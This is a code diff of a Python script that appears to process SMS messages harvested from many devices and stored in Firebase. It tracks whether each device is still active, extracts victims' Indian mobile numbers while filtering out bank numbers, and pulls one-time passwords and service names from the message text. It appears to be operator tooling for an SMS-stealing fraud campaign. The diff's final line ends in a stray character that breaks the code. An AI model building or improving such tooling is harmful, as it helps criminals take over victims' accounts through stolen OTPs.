@@ -6,7 +6,7 @@ async def fetch_fb(url, auth=None):
     if auth: full_url += f"?auth={auth}" if "?" not in full_url else f"&auth={auth}"
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(full_url, timeout=10) as resp:
+            async with session.get(full_url, timeout=8) as resp:
                 if resp.status == 200:
                     txt = await resp.text()
                     if txt == "null" or not txt: return {}
@@ -42,7 +42,7 @@ def decode_panel_url(panel_url):
     return None
 
 def calculate_health(msgs):
-    if not msgs: return 2 
+    if not msgs: return 1 # Dead
     latest_time = 0
     for m in msgs:
         m_id = m.get("id", 0)
@@ -67,6 +67,8 @@ def calculate_health(msgs):
 def extract_best_numbers(dev_data, msgs):
     all_text = " ".join([m.get("message", "") for m in msgs])
     matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', all_text)
+    
+    # Filter out fake/bank numbers
     bad_numbers = {"9264092640", "18001800", "919951860002", "18001035577", "1234567890"}
     matches = [m for m in matches if m not in bad_numbers]
     
@@ -83,10 +85,12 @@ def extract_best_numbers(dev_data, msgs):
                 if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
                     is_carrier = True
                     break
+        
         if is_carrier: score = 100 
         else: score = min(score + 20, 95) 
         scored_numbers.append((num, score))
 
+    # Check direct device metadata
     for key in ["phoneNumber", "phone", "number", "mobile"]:
         if dev_data.get(key):
             n = re.sub(r'\D', '', str(dev_data[key]))[-10:]
@@ -96,6 +100,7 @@ def extract_best_numbers(dev_data, msgs):
     best_nums = {}
     for n, s in scored_numbers:
         if n not in best_nums or s > best_nums[n]: best_nums[n] = s
+        
     return sorted(best_nums.items(), key=lambda x: x[1], reverse=True)[:2]
 
 def extract_otp(text):
@@ -111,4 +116,4 @@ def extract_service_name(text, sender):
     if sender:
         parts = sender.split("-")
         if len(parts) > 1: return parts[1]
-    return "Unknown"
+    return "Unknown"w
